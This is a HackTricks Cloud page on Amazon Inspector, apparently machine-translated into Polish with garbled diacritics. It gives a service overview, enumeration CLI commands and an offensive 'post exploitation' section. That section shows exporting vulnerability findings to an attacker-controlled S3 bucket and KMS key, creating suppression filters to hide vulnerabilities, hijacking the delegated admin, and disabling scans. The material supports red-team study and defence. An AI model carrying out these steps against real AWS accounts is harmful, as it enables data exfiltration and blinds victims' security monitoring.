# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Inspector

Amazon Inspector to zaawansowana, zautomatyzowana usuga zarzdzania lukami, zaprojektowana w celu zwikszenia bezpieczestwa Twojego rodowiska AWS. Usuga ta nieustannie skanuje instancje Amazon EC2, obrazy kontener贸w w Amazon ECR, Amazon ECS oraz funkcje AWS Lambda w poszukiwaniu luk i niezamierzonego nara偶enia na sie. Wykorzystujc solidn baz danych informacji o lukach, Amazon Inspector dostarcza szczeg贸owe wyniki, w tym poziomy ci偶koci i zalecenia dotyczce usunicia, pomagajc organizacjom proaktywnie identyfikowa i rozwizywa ryzyka bezpieczestwa. To kompleksowe podejcie zapewnia wzmocnion postaw bezpieczestwa w r贸偶nych usugach AWS, wspierajc zgodno i zarzdzanie ryzykiem.

### Key elements

#### Findings

Wyniki w Amazon Inspector to szczeg贸owe raporty dotyczce luk i nara偶e odkrytych podczas skanowania instancji EC2, repozytori贸w ECR lub funkcji Lambda. W zale偶noci od stanu, wyniki s klasyfikowane jako:

* **Aktywne**: Wynik nie zosta usunity.
* **Zamknite**: Wynik zosta usunity.
* **Tumione**: Wynik zosta oznaczony tym stanem z powodu jednej lub wicej **regu tumienia**.

Wyniki s r贸wnie偶 klasyfikowane w trzy nastpujce typy:

* **Pakiet**: Te wyniki dotycz luk w pakietach oprogramowania zainstalowanych na Twoich zasobach. Przykady obejmuj przestarzae biblioteki lub zale偶noci z znanymi problemami bezpieczestwa.
* **Kod**: Ta kategoria obejmuje luki znalezione w kodzie aplikacji dziaajcych na Twoich zasobach AWS. Typowe problemy to bdy w kodzie lub niebezpieczne praktyki, kt贸re mog prowadzi do narusze bezpieczestwa.
* **Sie**: Wyniki sieciowe identyfikuj potencjalne nara偶enia w konfiguracjach sieci, kt贸re mog by wykorzystywane przez atakujcych. Obejmuj one otwarte porty, niebezpieczne protokoy sieciowe i 藕le skonfigurowane grupy zabezpiecze.

#### Filters and Suppression Rules

Filtry i reguy tumienia w Amazon Inspector pomagaj zarzdza i priorytetyzowa wyniki. Filtry pozwalaj na zaw偶enie wynik贸w na podstawie okrelonych kryteri贸w, takich jak ci偶ko lub typ zasobu. Reguy tumienia pozwalaj na tumienie niekt贸rych wynik贸w, kt贸re s uwa偶ane za niskie ryzyko, zostay ju偶 zagodzone lub z jakiegokolwiek innego wa偶nego powodu, zapobiegajc ich przeci偶eniu w raportach bezpieczestwa i pozwalajc skupi si na bardziej krytycznych problemach.

#### Software Bill of Materials (SBOM)

Software Bill of Materials (SBOM) w Amazon Inspector to eksportowalna zagnie偶d偶ona lista inwentarzowa szczeg贸owo opisujca wszystkie komponenty w pakiecie oprogramowania, w tym biblioteki i zale偶noci. SBOM-y pomagaj zapewni przejrzysto w acuchu dostaw oprogramowania, umo偶liwiajc lepsze zarzdzanie lukami i zgodno. S kluczowe dla identyfikacji i agodzenia ryzyk zwizanych z komponentami oprogramowania open source i stron trzecich.

### Key features

#### Export findings

Amazon Inspector oferuje mo偶liwo eksportu wynik贸w do Amazon S3 Buckets, Amazon EventBridge i AWS Security Hub, co umo偶liwia generowanie szczeg贸owych raport贸w zidentyfikowanych luk i nara偶e do dalszej analizy lub udostpnienia w okrelonym terminie. Ta funkcja obsuguje r贸偶ne formaty wyjciowe, takie jak CSV i JSON, co uatwia integracj z innymi narzdziami i systemami. Funkcjonalno eksportu pozwala na dostosowanie danych zawartych w raportach, umo偶liwiajc filtrowanie wynik贸w na podstawie okrelonych kryteri贸w, takich jak ci偶ko, typ zasobu lub zakres dat, a domylnie obejmuje wszystkie Twoje wyniki w bie偶cym regionie AWS z aktywnym statusem.

Podczas eksportowania wynik贸w niezbdny jest klucz KMS (Key Management Service) do szyfrowania danych podczas eksportu. Klucze KMS zapewniaj, 偶e eksportowane wyniki s chronione przed nieautoryzowanym dostpem, zapewniajc dodatkow warstw bezpieczestwa dla wra偶liwych informacji o lukach.

#### Amazon EC2 instances scanning

Amazon Inspector oferuje solidne mo偶liwoci skanowania instancji Amazon EC2 w celu wykrywania luk i problem贸w z bezpieczestwem. Inspector por贸wnuje wyodrbnione metadane z instancji EC2 z zasadami z poradnik贸w bezpieczestwa, aby wygenerowa luki w pakietach i problemy z dostpnoci sieci. Te skany mog by przeprowadzane za pomoc metod **opartych na agencie** lub **bez agenta**, w zale偶noci od konfiguracji ustawie **trybu skanowania** Twojego konta.

* **Oparte na agencie**: Wykorzystuje agenta AWS Systems Manager (SSM) do przeprowadzania szczeg贸owych skan贸w. Ta metoda pozwala na kompleksowe zbieranie i analizowanie danych bezporednio z instancji.
* **Bez agenta**: Oferuje lekk alternatyw, kt贸ra nie wymaga instalacji agenta na instancji, tworzc migawk EBS ka偶dego woluminu instancji EC2, szukajc luk, a nastpnie j usuwajc; wykorzystujc istniejc infrastruktur AWS do skanowania.

Tryb skanowania okrela, kt贸ra metoda bdzie u偶ywana do przeprowadzania skan贸w EC2:

* **Oparte na agencie**: Wymaga zainstalowania agenta SSM na instancjach EC2 do gbokiej inspekcji.
* **Skanowanie hybrydowe**: czy metody oparte na agencie i bez agenta, aby maksymalizowa zasig i minimalizowa wpyw na wydajno. W tych instancjach EC2, gdzie zainstalowany jest agent SSM, Inspector przeprowadzi skanowanie oparte na agencie, a dla tych, gdzie nie ma agenta SSM, skanowanie bdzie przeprowadzane bez agenta.

Inn wa偶n cech jest **gboka inspekcja** dla instancji EC2 Linux. Ta funkcja oferuje dokadn analiz oprogramowania i konfiguracji instancji EC2 Linux, dostarczajc szczeg贸owe oceny luk, w tym luk w systemie operacyjnym, luk w aplikacjach i bd贸w konfiguracyjnych, zapewniajc kompleksow ocen bezpieczestwa. Osiga si to poprzez inspekcj **niestandardowych cie偶ek** i wszystkich ich podkatalog贸w. Domylnie Amazon Inspector skanuje nastpujce, ale ka偶de konto czonkowskie mo偶e zdefiniowa do 5 dodatkowych niestandardowych cie偶ek, a ka偶dy delegowany administrator do 10:

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Amazon ECR container images scanning

Amazon Inspector zapewnia solidne mo偶liwoci skanowania obraz贸w kontener贸w Amazon Elastic Container Registry (ECR), zapewniajc, 偶e luki w pakietach s wykrywane i zarzdzane efektywnie.

* **Podstawowe skanowanie**: To szybkie i lekkie skanowanie, kt贸re identyfikuje znane luki w pakietach systemu operacyjnego w obrazach kontener贸w, korzystajc z standardowego zestawu zasad z projektu open-source Clair. Przy tej konfiguracji skanowania Twoje repozytoria bd skanowane przy przesyaniu lub podczas rcznych skan贸w.
* **Zwikszone skanowanie**: Ta opcja dodaje funkcj cigego skanowania opr贸cz skanowania przy przesyaniu. Zwikszone skanowanie zagbia si gbiej w warstwy ka偶dego obrazu kontenera, aby zidentyfikowa luki w pakietach systemu operacyjnego i w pakietach jzyk贸w programowania z wy偶sz dokadnoci. Analizuje zar贸wno obraz bazowy, jak i wszelkie dodatkowe warstwy, zapewniajc kompleksowy przegld potencjalnych problem贸w z bezpieczestwem.

#### Amazon Lambda functions scanning

Amazon Inspector zawiera kompleksowe mo偶liwoci skanowania funkcji AWS Lambda i jej warstw, zapewniajc bezpieczestwo i integralno aplikacji bezserwerowych. Inspector oferuje dwa rodzaje skanowania dla funkcji Lambda:

* **Standardowe skanowanie Lambda**: Ta domylna funkcja identyfikuje luki w oprogramowaniu w zale偶nociach pakietu aplikacji dodanych do Twojej funkcji Lambda i warstw. Na przykad, jeli Twoja funkcja u偶ywa wersji biblioteki takiej jak python-jwt z znan luk, generuje wynik.
* **Skanowanie kodu Lambda**: Analizuje niestandardowy kod aplikacji w poszukiwaniu problem贸w z bezpieczestwem, wykrywajc luki, takie jak bdy wstrzykiwania, wycieki danych, saba kryptografia i brak szyfrowania. Zawiera fragmenty kodu podkrelajce wykryte luki, takie jak zakodowane na sztywno dane uwierzytelniajce. Wyniki zawieraj szczeg贸owe sugestie dotyczce usunicia i fragmenty kodu do naprawy problem贸w.

#### **Center for Internet Security (CIS) scans**

Amazon Inspector zawiera skanowania CIS, aby por贸wna systemy operacyjne instancji Amazon EC2 z najlepszymi praktykami zalecanymi przez Center for Internet Security (CIS). Te skanowania zapewniaj, 偶e konfiguracje s zgodne z bran偶owymi standardami bezpieczestwa.

* **Konfiguracja**: Skanowania CIS oceniaj, czy konfiguracje systemu speniaj okrelone zalecenia CIS Benchmark, z ka偶dym sprawdzeniem powizanym z identyfikatorem i tytuem sprawdzenia CIS.
* **Wykonanie**: Skanowania s przeprowadzane lub planowane na podstawie tag贸w instancji i zdefiniowanych harmonogram贸w.
* **Wyniki**: Wyniki po skanowaniu wskazuj, kt贸re sprawdzenia przeszy, zostay pominite lub nie powiody si, dostarczajc informacji o postawie bezpieczestwa ka偶dej instancji.

### Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### Post Exploitation

{% hint style="success" %}
Z perspektywy atakujcego, ta usuga mo偶e pom贸c atakujcemu w znalezieniu luk i ekspozycji sieci, kt贸re mog pom贸c mu w kompromitacji innych instancji/kontener贸w.

Jednak atakujcy mo偶e by r贸wnie偶 zainteresowany zak贸ceniem tej usugi, aby ofiara nie moga zobaczy luk (wszystkich lub konkretnych).
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Atakujcy m贸gby wygenerowa szczeg贸owe raporty dotyczce luk lub list materia贸w oprogramowania (SBOM) i wyeksportowa je z twojego rodowiska AWS. Informacje te mog by wykorzystane do zidentyfikowania konkretnych saboci, przestarzaego oprogramowania lub niebezpiecznych zale偶noci, co umo偶liwia ukierunkowane ataki.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
Przykad poni偶ej pokazuje, jak wyeksportowa wszystkie aktywne ustalenia z Amazon Inspector do kontrolowanego przez atakujcego Amazon S3 Bucket z kontrolowanym przez atakujcego kluczem Amazon KMS:

1. **Utw贸rz Amazon S3 Bucket** i docz do niego polityk, aby by dostpny z ofiary Amazon Inspector:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Utw贸rz klucz Amazon KMS** i docz do niego polityk, aby m贸g by u偶ywany przez Amazon Inspector ofiary:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. Wykonaj polecenie, aby **utworzy raport ustale**, eksfiltrujc go:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **Potencjalny wpyw**: Generowanie i eksfiltracja szczeg贸owych raport贸w o podatnociach i oprogramowaniu, uzyskiwanie informacji na temat konkretnych podatnoci i saboci w zabezpieczeniach.

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Napastnik m贸gby anulowa generowanie okrelonego raportu o podatnociach lub raportu SBOM, uniemo偶liwiajc zespoom bezpieczestwa otrzymywanie na czas informacji o podatnociach i oprogramowaniu (SBOM), op贸藕niajc wykrywanie i usuwanie problem贸w z zabezpieczeniami.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **Potencjalny wpyw**: Zak贸cenie monitorowania bezpieczestwa i uniemo偶liwienie terminowego wykrywania oraz usuwania problem贸w z bezpieczestwem.

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Napastnik z tymi uprawnieniami m贸gby manipulowa reguami filtrowania, kt贸re okrelaj, kt贸re podatnoci i problemy z bezpieczestwem s zgaszane lub tumione (jeli **akcja** jest ustawiona na SUPPRESS, zostanie utworzona regua tumienia). Mo偶e to ukry krytyczne podatnoci przed administratorami bezpieczestwa, uatwiajc wykorzystanie tych saboci bez wykrycia. Poprzez modyfikacj lub usunicie wa偶nych filtr贸w, napastnik m贸gby r贸wnie偶 generowa szum, zalewajc system nieistotnymi wynikami, co utrudniaoby skuteczne monitorowanie i reakcj na zagro偶enia.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **Potencjalny wpyw**: Ukrycie lub stumienie krytycznych luk w zabezpieczeniach, lub zalanie systemu nieistotnymi wynikami.

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Atakujcy m贸gby znaczco zak贸ci struktur zarzdzania bezpieczestwem.

* Dezaktywujc konto delegowanego administratora, atakujcy m贸gby uniemo偶liwi zespoowi ds. bezpieczestwa dostp do ustawie i raport贸w Amazon Inspector.
* Wczenie nieautoryzowanego konta administratora pozwolioby atakujcemu kontrolowa konfiguracje bezpieczestwa, potencjalnie dezaktywujc skany lub modyfikujc ustawienia, aby ukry zoliwe dziaania.

{% hint style="warning" %}
Wymagane jest, aby nieautoryzowane konto znajdowao si w tej samej Organizacji co ofiara, aby mogo sta si delegowanym administratorem.

Aby nieautoryzowane konto mogo sta si delegowanym administratorem, wymagane jest r贸wnie偶, aby po dezaktywowaniu legitymnego delegowanego administratora, a przed wczeniem nieautoryzowanego konta jako delegowanego administratora, legitymny administrator musia zosta wyrejestrowany jako delegowany administrator z organizacji. Mo偶na to zrobi za pomoc nastpujcego polecenia (**`organizations:DeregisterDelegatedAdministrator`** wymagana zgoda): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **Potencjalny wpyw**: Zak贸cenie zarzdzania bezpieczestwem.

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Napastnik m贸gby manipulowa stowarzyszeniem kont czonkowskich w organizacji Amazon Inspector. Poprzez stowarzyszenie nieautoryzowanych kont lub rozczenie legalnych, napastnik m贸gby kontrolowa, kt贸re konta s uwzgldniane w skanowaniu bezpieczestwa i raportowaniu. Mo偶e to prowadzi do wykluczenia krytycznych kont z monitorowania bezpieczestwa, umo偶liwiajc napastnikowi wykorzystanie luk w tych kontach bez wykrycia.

{% hint style="warning" %}
Ta akcja musi by wykonana przez delegowanego administratora.
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **Potencjalny wpyw**: Wykluczenie kluczowych kont z skan贸w bezpieczestwa, co umo偶liwia niewykryte wykorzystanie luk.

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

Napastnik z uprawnieniem `inspector2:Disable` m贸gby wyczy skany bezpieczestwa dla okrelonych typ贸w zasob贸w (EC2, ECR, Lambda, kod Lambda) w wyznaczonych kontach, pozostawiajc czci rodowiska AWS bez nadzoru i podatne na ataki. Dodatkowo, posiadajc uprawnienia **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`**, napastnik m贸gby nastpnie selektywnie ponownie wczy skany, aby unikn wykrycia podejrzanych konfiguracji.

{% hint style="warning" %}
Ta akcja musi by wykonana przez delegowanego administratora.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **Potencjalny wpyw**: Tworzenie martwych punkt贸w w monitorowaniu bezpieczestwa.

#### `inspector2:UpdateOrganizationConfiguration`

Atakujcy z tym uprawnieniem m贸gby zaktualizowa konfiguracje dla twojej organizacji Amazon Inspector, wpywajc na domylne funkcje skanowania wczone dla nowych kont czonkowskich.

{% hint style="warning" %}
Ta akcja musi by wykonana przez delegowanego administratora.
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **Potencjalny wpyw**: Zmiana polityk skanowania bezpieczestwa i konfiguracji dla organizacji.

#### `inspector2:TagResource`, `inspector2:UntagResource`

Napastnik m贸gby manipulowa tagami na zasobach AWS Inspector, kt贸re s kluczowe dla organizowania, ledzenia i automatyzacji ocen bezpieczestwa. Poprzez zmian lub usunicie tag贸w, napastnik m贸gby potencjalnie ukry luki w zabezpieczeniach przed skanowaniem bezpieczestwa, zak贸ci raportowanie zgodnoci i ingerowa w procesy automatycznej naprawy, co prowadzioby do niekontrolowanych problem贸w z bezpieczestwem i naruszenia integralnoci systemu.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **Potencjalny wpyw**: Ukrywanie luk, zak贸cenie raportowania zgodnoci, zak贸cenie automatyzacji bezpieczestwa oraz zak贸cenie alokacji koszt贸w.

## Odniesienia

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
